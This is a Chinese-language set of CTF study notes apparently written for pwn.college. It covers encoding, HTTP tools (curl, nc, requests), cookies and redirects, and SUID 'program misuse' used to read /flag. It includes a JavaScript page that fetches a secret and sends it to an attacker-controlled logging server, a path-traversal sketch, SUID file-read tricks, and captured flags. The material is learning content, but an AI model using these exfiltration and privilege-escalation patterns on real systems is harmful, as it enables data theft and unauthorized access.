> 在思考之前先行动.

# Playing With Programs.

> ​	一些安全中非常基本的话题。

## 编码

> ​	很基本的话题，就是关于encoding这块，我们再来熟悉一下。
>
> ​	编码，是编成一个二进制码，解码，是解成可读的字符。

echo + “|” 作为程序的输入。

```sh
echo "Hello, World!" | ./your_program
echo "Hello, World!" > input.txt
./your_program < input.txt
```

取消自动补上一个换行符：

```sh
echo -n "yourpassword" | /challenge/runme
```

没有权限创建文件但是还需要程序从某个文件读取？

```sh
$ echo -n bvwmigzr > /tmp/mypass	# 首先创建一个临时的文件
$ exec 3</tmp/mypass 				# 为这个临时的文件分配一个fd
$ ln -s /proc/self/fd/3 byyf		# 创建符号链接，也就是一个“伪文件”，实际指向的是mypass
$ /challenge/runme 					# 这个程序会读取我们的伪造文件
Read 8 bytes.
Congrats! Here is your flag:
```

> ​	Now, life must get complex. You may have noticed the `b` letters in front of the password constants throughout this module. Python has two types of string-like constants: `str`ings (specified as `"asdf"`) and `bytes` (specified as `b"asdf"`). Let's talk about `bytes` in this level.
>

**Fun facts:** Some other Pythonisms that might be useful:

- If you `print(n)` a number or convert it to a string with `str(n)`, the number will be represented in base 10.
- You can get a hexadecimal string representation of a number using `hex(n)`.
- You can get a binary string representation of a number using `bin(n)`.
- Converting a string to a number with `int(s)` will read it as a base 10 number by default.
- You can specify a different base to use with a second argument: `int(s, 16)` will interpret the string as hex, `int(s, 2)` will interpret it as binary.
- You can try to auto-identify the number base using `int(s, 0)`, which requires a prefex on the string (`0b` or binary, `0x` for hex, nothing for decimal).

decode()是把字节转换为str的方法。

```py
>>> bytes.fromhex("68656c6c6f")
b'hello'

>>> bytes.fromhex("68 65 6c 6c 6f")
b'hello'
```

区分好这两个概念：

| 项目         | 字符串 (`str`)    | 字节串 (`bytes`)              |
| ------------ | ----------------- | ----------------------------- |
| 表示内容     | 人类可读字符      | 原始字节（二进制）            |
| 示例         | `"abc"`           | `b"abc"` 或 `b"\x61\x62\x63"` |
| 转换为 bytes | `"abc".encode()`  | 本身就是 `bytes` 类型         |
| 转换为 str   | `b"abc".decode()` | 解码得到 `"abc"`              |

### ASCII表

> ​	Values *above* `0x80` ("extended ASCII") were used by different countries for their own characters, leading to some chaos due to colliding byte values. In the US, the typical "extended ASCII" encoding was called [Latin 1](https://en.wikipedia.org/wiki/ISO/IEC_8859-1), and it defined a character for each of the 256 possible byte values. This is useful for us because we can use "latin1" to easily convert between Python's bytes and strings, including: `b"\x80".decode("latin1")`.

| Dec  | Hex  | Char | 说明               |
| ---- | ---- | ---- | ------------------ |
| 0    | 0x00 | NUL  | 空字符（Null）     |
| 1    | 0x01 | SOH  | 标题开始           |
| 2    | 0x02 | STX  | 正文开始           |
| 3    | 0x03 | ETX  | 正文结束           |
| 4    | 0x04 | EOT  | 传输结束           |
| 5    | 0x05 | ENQ  | 请求               |
| 6    | 0x06 | ACK  | 收到通知           |
| 7    | 0x07 | BEL  | 响铃（Beep）       |
| 8    | 0x08 | BS   | 退格               |
| 9    | 0x09 | TAB  | 水平制表符（Tab）  |
| 10   | 0x0A | LF   | 换行               |
| 11   | 0x0B | VT   | 垂直制表符         |
| 12   | 0x0C | FF   | 换页               |
| 13   | 0x0D | CR   | 回车               |
| 14   | 0x0E | SO   | Shift Out          |
| 15   | 0x0F | SI   | Shift In           |
| 16   | 0x10 | DLE  | 数据链路转义       |
| 17   | 0x11 | DC1  | 设备控制 1         |
| 18   | 0x12 | DC2  | 设备控制 2         |
| 19   | 0x13 | DC3  | 设备控制 3         |
| 20   | 0x14 | DC4  | 设备控制 4         |
| 21   | 0x15 | NAK  | 否定应答           |
| 22   | 0x16 | SYN  | 同步               |
| 23   | 0x17 | ETB  | 传输块结束         |
| 24   | 0x18 | CAN  | 取消               |
| 25   | 0x19 | EM   | 介质结束           |
| 26   | 0x1A | SUB  | 替换               |
| 27   | 0x1B | ESC  | 转义               |
| 28   | 0x1C | FS   | 文件分隔符         |
| 29   | 0x1D | GS   | 组分隔符           |
| 30   | 0x1E | RS   | 记录分隔符         |
| 31   | 0x1F | US   | 单元分隔符         |
| 32   | 0x20 |      | 空格               |
| 33   | 0x21 | !    | 感叹号             |
| 34   | 0x22 | "    | 双引号             |
| 35   | 0x23 | #    | 井号               |
| 36   | 0x24 | $    | 美元符号           |
| 37   | 0x25 | %    | 百分号             |
| 38   | 0x26 | &    | 和号               |
| 39   | 0x27 | '    | 单引号             |
| 40   | 0x28 | (    | 左括号             |
| 41   | 0x29 | )    | 右括号             |
| 42   | 0x2A | *    | 星号               |
| 43   | 0x2B | +    | 加号               |
| 44   | 0x2C | ,    | 逗号               |
| 45   | 0x2D | -    | 减号               |
| 46   | 0x2E | .    | 点号               |
| 47   | 0x2F | /    | 斜杠               |
| 48   | 0x30 | 0    | 数字 0             |
| 49   | 0x31 | 1    | 数字 1             |
| 50   | 0x32 | 2    | 数字 2             |
| 51   | 0x33 | 3    | 数字 3             |
| 52   | 0x34 | 4    | 数字 4             |
| 53   | 0x35 | 5    | 数字 5             |
| 54   | 0x36 | 6    | 数字 6             |
| 55   | 0x37 | 7    | 数字 7             |
| 56   | 0x38 | 8    | 数字 8             |
| 57   | 0x39 | 9    | 数字 9             |
| 58   | 0x3A | :    | 冒号               |
| 59   | 0x3B | ;    | 分号               |
| 60   | 0x3C | <    | 小于号             |
| 61   | 0x3D | =    | 等号               |
| 62   | 0x3E | >    | 大于号             |
| 63   | 0x3F | ?    | 问号               |
| 64   | 0x40 | @    | 邮箱符号           |
| 65   | 0x41 | A    | 大写 A             |
| 66   | 0x42 | B    | 大写 B             |
| 67   | 0x43 | C    | 大写 C             |
| 68   | 0x44 | D    | 大写 D             |
| 69   | 0x45 | E    | 大写 E             |
| 70   | 0x46 | F    | 大写 F             |
| 71   | 0x47 | G    | 大写 G             |
| 72   | 0x48 | H    | 大写 H             |
| 73   | 0x49 | I    | 大写 I             |
| 74   | 0x4A | J    | 大写 J             |
| 75   | 0x4B | K    | 大写 K             |
| 76   | 0x4C | L    | 大写 L             |
| 77   | 0x4D | M    | 大写 M             |
| 78   | 0x4E | N    | 大写 N             |
| 79   | 0x4F | O    | 大写 O             |
| 80   | 0x50 | P    | 大写 P             |
| 81   | 0x51 | Q    | 大写 Q             |
| 82   | 0x52 | R    | 大写 R             |
| 83   | 0x53 | S    | 大写 S             |
| 84   | 0x54 | T    | 大写 T             |
| 85   | 0x55 | U    | 大写 U             |
| 86   | 0x56 | V    | 大写 V             |
| 87   | 0x57 | W    | 大写 W             |
| 88   | 0x58 | X    | 大写 X             |
| 89   | 0x59 | Y    | 大写 Y             |
| 90   | 0x5A | Z    | 大写 Z             |
| 91   | 0x5B | [    | 左中括号           |
| 92   | 0x5C | \    | 反斜杠             |
| 93   | 0x5D | ]    | 右中括号           |
| 94   | 0x5E | ^    | 脱字符             |
| 95   | 0x5F | _    | 下划线             |
| 96   | 0x60 | `    | 重音符             |
| 97   | 0x61 | a    | 小写 a             |
| 98   | 0x62 | b    | 小写 b             |
| 99   | 0x63 | c    | 小写 c             |
| 100  | 0x64 | d    | 小写 d             |
| 101  | 0x65 | e    | 小写 e             |
| 102  | 0x66 | f    | 小写 f             |
| 103  | 0x67 | g    | 小写 g             |
| 104  | 0x68 | h    | 小写 h             |
| 105  | 0x69 | i    | 小写 i             |
| 106  | 0x6A | j    | 小写 j             |
| 107  | 0x6B | k    | 小写 k             |
| 108  | 0x6C | l    | 小写 l             |
| 109  | 0x6D | m    | 小写 m             |
| 110  | 0x6E | n    | 小写 n             |
| 111  | 0x6F | o    | 小写 o             |
| 112  | 0x70 | p    | 小写 p             |
| 113  | 0x71 | q    | 小写 q             |
| 114  | 0x72 | r    | 小写 r             |
| 115  | 0x73 | s    | 小写 s             |
| 116  | 0x74 | t    | 小写 t             |
| 117  | 0x75 | u    | 小写 u             |
| 118  | 0x76 | v    | 小写 v             |
| 119  | 0x77 | w    | 小写 w             |
| 120  | 0x78 | x    | 小写 x             |
| 121  | 0x79 | y    | 小写 y             |
| 122  | 0x7A | z    | 小写 z             |
| 123  | 0x7B | {    | 左大括号           |
| 124  | 0x7C | \|   | 竖线               |
| 125  | 0x7D | }    | 右大括号           |
| 126  | 0x7E | ~    | 波浪线             |
| 127  | 0x7F | DEL  | 删除字符（Delete） |

在实际中我们用pwntools来和程序进行交互，就是使用py脚本。

### 理解

> ​	比如这样的一个程序，实际上我们是要来构造一个字节流的输入，然后程序会把我们的字节流解码成二进制的字符串，接着进行比较的操作。

```py
import sys


def decode_from_bits(s):
    s = s.decode("latin1")
    assert set(s) <= {"0", "1"}, "non-binary characters found in bitstream!"
    assert len(s) % 8 == 0, "must enter data in complete bytes (each byte is 8 bits)"
    return int.to_bytes(int(s, 2), length=len(s) // 8, byteorder="big")


print("Enter the password:")
entered_password = sys.stdin.buffer.read1()
correct_password = b"1001110011101000110101011000110011010011110110111111101110111010"

print(f"Read {len(entered_password)} bytes.")


correct_password = decode_from_bits(correct_password)


if entered_password == correct_password:
    print("Congrats! Here is your flag:")
    print(open("/flag").read().strip())
else:
    print("Incorrect!")
    sys.exit(1)
```

实际上就是：

```py
import pwn
p = pwn.process("/challenge/runme")
p.write(b"\x9c\xe8\xd5\x8c\xd3\xdb\xfb\xba")
result = p.readall()
print(result)
```

UTF-8编码，宽字符的编码问题。--->最全最完整的，并且也是国际通用的。

解码不一致而造成的路径穿越的攻击：

**UTF-8**：

- 与 ASCII 向后兼容（前 128 个字符编码一致）
- 是网页、JSON、URL 编码等主流格式的默认编码

**UTF-16**：

- 不兼容 ASCII，文件开头通常需要 **BOM（Byte Order Mark）** 来标识字节序（大端或小端）
- 在 Java 和 Windows 内部常用

```py
# 伪代码
user_input = get_input_from_user()  # 攻击者输入: %2e%2e/%2e%2e/secret.txt
decoded_once = urllib.parse.unquote(user_input)  # 第一次 decode：变成 ../..../secret.txt
if ".." in decoded_once:
    reject_request()
else:
    file_path = os.path.join(base_dir, urllib.parse.unquote(user_input))
    open(file_path)  # 第二次 decode（再次解码 %2e%2e → ..），打开敏感文件

```

> ​	涉及到UTF-16的之类的编码，我们不要手写，而要用py来生成，这也是最好和最快的选择,也是作为一个程序员的选择。
>

```py
with open("input03.txt", "wb") as f:
    f.write("pfjwmfxa".encode("utf-16"))
```

当我们能更改编码时，可能会出现错误：

```console
hacker@dojo:~$ ipython
In [1]: "🎈".encode("utf-8")
Out[1]: b'\xf0\x9f\x8e\x88'
```

​	If we mess with the resulting bytes, and then decode them, we would (of course) get something different:

```console
In [2]: b'\xf0\x9f\x8e\xaa'.decode("utf-8")
Out[2]: '🎪'

In [3]: b'\xf0\x9f\x8e\x42'.decode("utf-8")
---------------------------------------------------------------------------
UnicodeDecodeError                        Traceback (most recent call last)
Cell In[3], line 1
----> 1 b'\xf0\x9f\x8e\x42'.decode("utf-8")

UnicodeDecodeError: 'utf-8' codec can't decode bytes in position 0-2: invalid continuation byte
```

那么就可以更改来达到攻击的效果。

接下来是**base64**编码的问题：

​	The name "base64" comes from the fact that there are 64 characters used in each output character. These can actually vary, but the standard base64 encoding uses an "alphabet" of the uppercase letters `A` through `Z`, the lowercase letters `a` through `z`, the digits `0` through `9`, and the `+` and `/` symbols. This results in 64 total output symbols, and each symbol can encode `2**6` (2 to the power of 6) possible input symbols, or 6 bits of data. That means that to encode a single byte (8 bits) of input, you need more than one base64 output character. In fact, you need *two*: one that encodes the first 6 bits and one that encodes the remaining 2 (with 4 bits of that second output character being unused). To mark these unused bits, base64 encoded data appends an `=` for every two unused bits. For example:

```sh
hacker@dojo:~$ echo -n A | base64
QQ==
hacker@dojo:~$ echo -n AA | base64
QUE=
hacker@dojo:~$ echo -n AAA | base64
QUFB
hacker@dojo:~$ echo -n AAAA | base64
QUFBQQ==
```

​	Base64 编码将 **每三个字节（3×8=24位）** 的数据，分为 **四组（4×6=24位）**，每组6位，用下面这个 **64个字符的表** 来映射编码：

```txt
A–Z => 0–25  
a–z => 26–51  
0–9 => 52–61  
+    => 62  
/    => 63
```

​	注意，有人可能会混淆，编码肯定不能提升安全性，可能有一点混淆视听的效果，当我们尝试去攻击的时候：

> ​	"Good Artists Copy, Great Artists Steal!" When you're doing security analysis and need to interact with bespoke software, ripping the implementations of custom communication protocols out of that software is a good way to reach interoperability. 

仔细阅读互操作和通信部分的代码。

> ​	关于编码，就是类似于等式两边变形最终相同一样，当加密手段没有被加入的时候，其实是不复杂的，但是要理解编码的原理以及目的的问题。

## web基础

### 关于GET和POST以及基本网络工具和py库

发起Http GET请求



Flask,小型web框架,py





page source查看网页的源代码



**metadata**元数据,是用来描述数据的数据

请求元数据:



| Header 字段       | 说明                                                 |
| ----------------- | ---------------------------------------------------- |
| `Host`            | 目标主机域名或IP（必须字段）                         |
| `User-Agent`      | 客户端信息（如浏览器类型）                           |
| `Accept`          | 支持的内容类型（如 `text/html`、`application/json`） |
| `Accept-Encoding` | 支持的压缩格式（如 `gzip`, `deflate`）               |
| `Cookie`          | 携带的用户 cookie                                    |
| `Authorization`   | 身份验证信息（如 token）                             |
| `Content-Length`  | 请求体的长度（用于 POST）                            |
| `Content-Type`    | 请求体的类型（如 `application/json`）                |

相应元数据:

| Header 字段                   | 说明                                                 |
| ----------------------------- | ---------------------------------------------------- |
| `Content-Type`                | 响应内容的类型（如 `text/html`, `application/json`） |
| `Content-Length`              | 内容的字节数                                         |
| `Set-Cookie`                  | 设置客户端 cookie                                    |
| `Server`                      | 服务器信息（如 nginx, Apache）                       |
| `Cache-Control`               | 缓存策略                                             |
| `Content-Encoding`            | 响应内容的压缩格式                                   |
| `Access-Control-Allow-Origin` | CORS 跨域设置                                        |
| `Date`                        | 响应发送时间                                         |



**netcat**命令:可以实现很多有意思的功能.

```sh
nc [选项] 主机名/IP地址 端口
```

比如:

```sh
$ nc 127.0.0.1 80 # 监听本地的80端口
```

**http**的**request**格式:

```http
GET /path/to/resource HTTP/1.1
Host: example.com
User-Agent: curl/7.68.0
Accept: */*

<空行>
```



curl命令:http中进行数据的传输.

发送一个GET请求.

```sh
curl http://example.com
```

比如访问一个本地的Sever:

```sh
curl -X GET http://localhost:80/validate
```



发起一个POST请求.

```sh
curl -X POST -d "username=admin&password=1234" http://example.com/login
```



添加请求header.

```sh
curl -H "Authorization: Bearer TOKEN123" http://example.com/api
```



文件upload.

```sh
curl -F "file=@example.txt" http://example.com/upload
```



比如要分析或者逆向一个httpServer.

| 选项            | 说明                                      |
| --------------- | ----------------------------------------- |
| `-X`            | 指定请求方法（如 GET、POST、PUT、DELETE） |
| `-d`            | 发送表单数据（POST 请求）                 |
| `-H`            | 自定义请求头                              |
| `-F`            | 表单上传文件（multipart/form-data）       |
| `-o`            | 将输出写入文件                            |
| `-L`            | 跟随重定向（如 301、302）                 |
| `-v`            | 输出详细过程                              |
| `--data-binary` | 发送原始数据流                            |



我们的测试利器:https://requests.readthedocs.io/en/latest/

> 不是哥们,这真有点帅了......

![Requests logo](https://requests.readthedocs.io/en/latest/_static/requests-sidebar.png)

主要利用request library,就是脚本.

​	现代的大型服务器通常会托管多个网站,而用户的host请求头指名了我们要请求哪些网站的资源,有很多虚拟主机,而host确定了我们要访问的是哪个虚拟主机.

​	我们手动设置headers.

```py
import requests
url = 'http://localhost:80/qualify'
headers = {
    "Host":"cryptohack.org:80"
}
r = requests.get(url, headers = headers)
print(r.text)
```

用curl请求:

```sh
curl -H "Host:www.google.com" http://localhost:80/man
```

用nc手动构造一次请求.

> ​	我们要了解其中的细节问题.

```sh
$ curl -v -H "Host:flaws.cloud:80" http://localhost:80/check
* Host localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 33860 failed: Connection refused
*   Trying 127.0.0.1:80...
* Connected to localhost (127.0.0.1) port 80
* using HTTP/1.x
> GET /check HTTP/1.1
> Host:flaws.cloud:80
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 400 BAD REQUEST
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Tue, 22 Jul 2025 04:24:06 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 149
< Connection: close
< 
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>You are using an incorrect client to access this resource!</p>
* shutting down connection #0
```



​	Any tricky characters (such as spaces) are simply hex-encoded, with a `%` plopped in front of them. Of course, because `%` thus becomes a tricky character in itself, it must also be encoded. In the above example, `/solve my challenge` would become `/solve%20my%20challenge`, as the hex value of the ASCII space character is `0x20`.

​	如果url的路径出现了空格,那么就有问题.空格直接解析成%20.



请求中可以携带参数,比如:

```sh
http://example.com/search?keyword=cat&limit=5
```

中的`keyword=cat&limit=5`就是Query String.

客户端不可信,就会造成安全问题:

> ​	It's tempting to think of HTTP parameters as similar to parameters to a function call. However, keep in mind: when you're writing C or Python or Java code, an attacker (typically) can't just call random functions in your program with random parameters. But with HTTP, they *can*. They can just make HTTP requests wherever they want! This has caused quite a few security issues...

传递参数:

```py
import requests
url = 'http://localhost:80/authenticate'
headers = {
    "Host":"challenge.localhost:80"
}
payload = {
    "security":"ekddfknb"
}
r = requests.get(url, headers = headers, params=payload)
print(r.text)
```

怎么传递多参数?

```txt
/authenticate?secure_key=jcbaywzw&private_key=miwgzszt&access_code=buadbiky
```

在使用 `curl` 指定多个 HTTP 参数（即多个 GET 参数）时，需要特别小心，因为：

- 在 **shell（终端）中**，`&` 有特殊含义 —— 它不是普通字符，而是用来将命令放到后台执行的。

- 所以如果你在命令行中直接写：

- ```sh
  curl http://localhost:80/authenticate?secure_key=xxx&private_key=yyy&access_code=zzz
  ```

  shell 会把 `&private_key=yyy` 和 `&access_code=zzz` 当作新的命令（甚至后台运行的命令），**不是 URL 的一部分**。

如果有多个参数,使用了&,那么一定要加上'',注意这里的细节.

http form表单的提交POST

浏览器直接提交,比如注册信息之类的

那么curl命令:

```sh
$ curl -H "Host:challenge.localhost:80" -X POST "http://localhost:80/meet" -d "access=ugchpjev"
```

那么实际的请求是:

A form using `application/x-www-form-urlencoded` content encoding (the default) sends a request where the body contains the form data in `key=value` pairs, with each pair separated by an `&` symbol, as shown below:

> ​	用nc提交表单是比较麻烦的,要把header和body之间分开才可以.并且注意多个参数的处理方法,长度也必须经过计算才可以得到.

```http
POST /test HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

field1=value1&field2=value2
```



用py来做处理:

```py
import requests
url = 'http://localhost:80/hack'
payload = {
    "challenge_key":"bxfzwxzl"
}
headers = {
    "Host":"challenge.localhost:80"
}
r = requests.post(url, headers = headers, data = payload)
print(r.text)
```



或者写html,直接构造表单,然后用浏览器打开:

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="http://challenge.localhost/gate" method="POST">
      <input type="hidden" name="credential" value="cejsemob">
      <input type="submit" value="Submit">
    </form>
  </body>
</html>
```

那么就是小练习,提交多参数的表单:

```sh
curl -v -X POST "http://localhost:80/hack" \
  -H "Host: challenge.localhost:80" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=ieovmiim&authcode=dhcrcdvp&access=cbmupwsi"
```

> ​	注意中间的空格,没有空格就和在一起了,会出错.
>

### Redirects(重定位)

> ​	也是一个有趣并且常见的话题.
>

原理就是:

```py
@app.route("/", methods=["GET"])
def challenge_redirector():
    if name_of_program_for(peer_process_of(flask.request.input_stream.fileno())) not in ["nc"]:
        flask.abort(400, "You are using an incorrect client to access this resource!")

    return flask.redirect(f"/{secret_endpoint}-gateway")


@app.route(f"/{secret_endpoint}-gateway", methods=["GET"])
def challenge():
    if name_of_program_for(peer_process_of(flask.request.input_stream.fileno())) not in ["nc"]:
        flask.abort(400, "You are using an incorrect client to access this resource!")

    return f"""
        <html>
          <head><title>Talking Web</title></head>
        <body>
          <h1>Great job!</h1>
          <p>{open("/flag").read().strip()}</p>
        </body>
        </html>
    """
```

很简单,当我们请求的时候返回了一个新的URL.

接着我们使用curl命令,-L能够直**接跟随重定向**来处理,非常方便,分析过程:

```sh
$ curl -v -L -H "Host:challenge.localhost:80" "http://localhost:80/"
* Host localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 53122 failed: Connection refused
*   Trying 127.0.0.1:80...
* Connected to localhost (127.0.0.1) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host:challenge.localhost:80
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 FOUND
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Tue, 22 Jul 2025 15:59:38 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 221
< Location: /xOmLEvDu-qualify
< Connection: close
< 
* shutting down connection #0
* Issue another request to this URL: 'http://localhost:80/xOmLEvDu-qualify'
* Hostname localhost was found in DNS cache
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 53124 failed: Connection refused
*   Trying 127.0.0.1:80...
* Connected to localhost (127.0.0.1) port 80
* using HTTP/1.x
> GET /xOmLEvDu-qualify HTTP/1.1
> Host:challenge.localhost:80
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Tue, 22 Jul 2025 15:59:38 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 224
< Connection: close
< 

        <html>
          <head><title>Talking Web</title></head>
        <body>
          <h1>Great job!</h1>
          <p>pwn.college{M4e0fOBc4jlqEJbSN9HQ48rt0u1.QX4kjMzwyM2gjMyEzW}</p>
        </body>
        </html>
* shutting down connection #1
```

py的requests库也可以直接跟随重定向.

### Cookies

> ​	服务器保持无状态,防止占用过多的资源.

Server给Client分配一段cookie,之后交互的过程中会自动携带上这一段cookie:

1.用户登录认证（如登录状态维持）

2.会话管理（如购物车、语言偏好）

3.跟踪用户行为（广告/分析）

比如:

```txt
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 FOUND
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Wed, 23 Jul 2025 02:29:04 GMT
< Content-Length: 189
< Location: /
< Set-Cookie: cookie=3c7d6a2b6b7ebc20bc71c719e8cac768; Path=/
< Server: pwn.college
< Connection: close
```

Server给我们分配了一段cookie.

当我们使用curl带cookie去requests的时候:

```sh
$ curl -v -L -b "3c7d6a2b6b7ebc20bc71c719e8cac768" "http://localhost:80/"
```

如果使用nc带cookie的话:

```sh
$ nc 127.0.0.1 80
GET / HTTP/1.1
Host: 127.0.0.1
Cookie: cookie=fc8ec903d4b8a0e0b30fb5ade530809b
```

有状态的Server保存上下文,requests应该会自动处理.

一个开始时最简单的Server:

```py
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/", methods=["GET"])
def challenge():
    if "Firefox" not in flask.request.headers.get("User-Agent"):
        flask.abort(400, "You are using an incorrect client to access this resource!")

    return f"""
        <html>
          <head><title>Talking Web</title></head>
        <body>
          <h1>Great job!</h1>
          <p>{open("/flag").read().strip()}</p>
        </body>
        </html>
    """


app.secret_key = os.urandom(8)
app.run("challenge.localhost", 80)
```

我们打起来一个Server监听客户端的连接.

那么怎么自己给客户端做重定向.

> ​	不会就找文档.

https://flask.palletsprojects.com/en/stable/

注意不要把域名指定错误了,妈的.

### JavaScript

用JS加上我们上面写的重定向的代码来搞浏览器的重定向:

```html
<html>
    <head><title>GOGOGO</title></head>
    <body>
        <script>
            window.location = "http://localhost:1337/"
        </script>
    </body>
</html>
```

> ​	Exfiltration is the art of smuggling sensitive data out right under the nose of its owners: in this case, /challenge/client and /challenge/server.
>
> ​	这是比较复杂的.

**XSS（跨站脚本）+ 数据外泄（Exfiltration）模拟**

比如一个client访问页面:

```html
<!DOCTYPE html>
<html>
    <head><title>GOGOGO</title></head>
    <body>
        <script src="http://challenge.localhost:80/gate"></script>
        <script>
            fetch("http://challenge.localhost:1337/log?flag=" + encodeURIComponent(flag))
        </script>
    </body>
</html>
```

​	第一行执行了另一个网站的脚本,并返回flag,第二行用fetch不动声色的泄露信息,把这个flag传送到我自己的server上面去.

接着我的server会把获取到的信息打印出来:

```py
@app.route("/log", methods=["GET"])
def find_flag():
    flag = flask.request.args.get("flag", "")
    print(f"[+] Exfiltrated flag: {flag}")
    return "Flag received", 200
```

我们经常会使用fetch语句:

```js
fetch("http://google.com")
    .then(response => response.text())
    .then(website_content => ???)
```

那么如果Server返回的不是一个脚本而是纯文本我们怎么传输:

```html
<!DOCTYPE html>
<html>
    <head><title>GOGOGO</title></head>
    <body>
        <script>
            fetch("http://challenge.localhost:80/verify")
                .then(response => response.text())
                .then(flag => {
                     fetch("http://challenge.localhost:1337/log?flag=" + encodeURIComponent(flag))
                });
        </script>
    </body>
</html>
```

先用fetch拿到response的数据,接着再去进行链式调用.

同样的,你也可以在verify后加一些参数.

我们还可以用fetch做POST请求:

```js
<!DOCTYPE html>
<html>
    <head><title>GOGOGO</title></head>
    <body>
        <script>
            fetch("http://challenge.localhost:80/verify", {
               method:"POST",
               headers:{
                "Content-Type":"application/x-www-form-urlencoded"
               },
               body:"unlock_code=chrzavej&secure_key=vwzljzcv&private_key=leqhqzzg"
            })
            .then(response => response.text())
            .then(flag => {
                     fetch("http://challenge.localhost:1337/log?flag=" + encodeURIComponent(flag))
                });
        </script>
    </body>
</html>
```

这个就是类似于lambda的函数.



## Program Misuse

> ​	本模块主要讨论linux命令的提权,简简单来说就是通过漏洞读取到或者能执行原来只有root用户能执行的程序.
>

​	假设有一个被设置了 SUID 的程序 `/usr/bin/less`（用于分页显示文件内容），你平时用它查看自己的文件没问题。但如果这个程序拥有 root 权限运行，并且你能通过它打开任意文件——那你就可能通过它**读取系统中只有 root 才能访问的文件（比如 `/root/flag.txt`）**。这就是提权.总之就是用一些读文件的提权程序来获取想要的东西.

### 读取

vim保存到可读的文件内部:

```vim
:w /tmp/myflag.txt
```

一下让我用emacs我用不明白,我靠.

od命令以8进制形式读取:

```sh
bash-5.2$ /challenge/od /flag 
0000000 073560 027156 067543 066154 063545 075545 030511 053150
0000020 030115 043471 047145 054511 032521 042066 043545 033525
0000040 034161 061122 051516 027172 047144 047124 073570 046571
0000060 063462 046552 042571 053572 005175
0000072
bash-5.2$ /challenge/od -c /flag 
0000000   p   w   n   .   c   o   l   l   e   g   e   {   I   1   h   V
0000020   M   0   9   G   e   N   I   Y   Q   5   6   D   e   G   U   7
0000040   q   8   R   b   N   S   z   .   d   N   T   N   x   w   y   M
0000060   2   g   j   M   y   E   z   W   }  \n
0000072
```

hd,应该是16进制:hexdump工具:

```sh
bash-5.2$ /challenge/hd /flag
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 30 52 76 48  |pwn.college{0RvH|
00000010  68 6f 4c 71 78 49 2d 56  36 73 72 65 43 68 39 75  |hoLqxI-V6sreCh9u|
00000020  49 61 69 57 69 36 54 2e  64 52 54 4e 78 77 79 4d  |IaiWi6T.dRTNxwyM|
00000030  32 67 6a 4d 79 45 7a 57  7d 0a                    |2gjMyEzW}.|
0000003a
```

先可以先编码再解码:

```sh
bash-5.2$ /challenge/base32 /flag | base32 -d
pwn.college{ozIbUKD4FugLiKOYb3nxZsqWyNW.dZTNxwyM2gjMyEzW}
```

split拆分文件:

```sh
split -l 1000 bigfile.txt part_
```

这会生成文件：`part_aa`, `part_ab`, `part_ac`... 依次命名。

`-l 行数` ：按行数拆分，比如每 1000 行一个文件。

`-b 字节数` ：按大小拆分，比如每 10M 一个文件：`split -b 10M bigfile`。

`-d` ：用数字作为后缀（如 part_00, part_01），而不是字母。

### 压缩,打包,归档工具

压缩程序也是同理:

zip and unzip	tar	bzip	gzip

直接输出到终端.

```sh
$ bzip2 -dc /flag.bz2
```

`tar` 是 Linux/Unix 系统中常用的打包和解包工具，通常用于 `.tar`、`.tar.gz`、`.tar.bz2` 等格式的归档文件。

tar的命令参数比较多,可以直接查:

```sh
tar -czf archive.tar.gz 文件或目录
```

`ar` 是 Unix/Linux 下用来创建、修改、提取 **静态库文件**（比如 `.a` 文件）和简单归档文件的工具。它常用于**生成静态链接库**。

> ​	学过linker部分就知道.

```sh
ar rcs libfoo.a file1.o file2.o
```

- `r`：插入（replace）文件到归档
- `c`：创建新的归档（不显示提示）
- `s`：创建索引，便于快速查找

这个命令会将 `file1.o` 和 `file2.o` 打包成静态库 `libfoo.a`。

查看内容:

```
ar t libfoo.a
```

提取文件:

```
ar x libfoo.a file1.o
```

删除这个归档中的文件:

```
ar d libfoo.a file1.o
```



`cpio` 是一个强大的打包工具，用于将文件归档、解包或复制。它不像 `tar` 那样常用，但在某些系统工具中（如 Linux 内核 `initramfs`）仍然很重要。

```sh
find . -type f | cpio -o > archive.cpio
```

```sh
bash-5.2$ echo /flag | /challenge/cpio -o > ./c.cpio
1 block
bash-5.2$ ls
Desktop  asm  c.cpio  encoding  leap  public_html  testdir  web_talking
bash-5.2$ ls -l c.cpio 
-rw-r--r-- 1 hacker hacker 512 Jul 25 04:24 c.cpio
bash-5.2$ cat c.cpio 
�q�r��h�:/flagpwn.college{AZZyiu3WItcJ3QZo2zQBhHj1arx.dRjNxwyM2gjMyEzW}
�q
  TRAILER!!!
```

> ​	打包之后的文件是有权限的,直接读取,不要再解包了,这样就没有意义了,因为不能读取的权限还是不能更改.
>

`genisoimage` 是一个用来创建 ISO 9660 文件系统镜像的工具，常用于把文件或目录打包成 ISO 镜像文件，通常用于刻录光盘（CD/DVD）或虚拟光驱挂载。

generate iso image.

```sh
genisoimage -o myarchive.iso -R -J /tmp/iso_root
```

结果用正常的手段处理失败,没有read的权限就无法对于/flag进行打包的操作,用符号链接欺骗也没有作用:

```sh
bash-5.2$ genisoimage -sort "/flag"
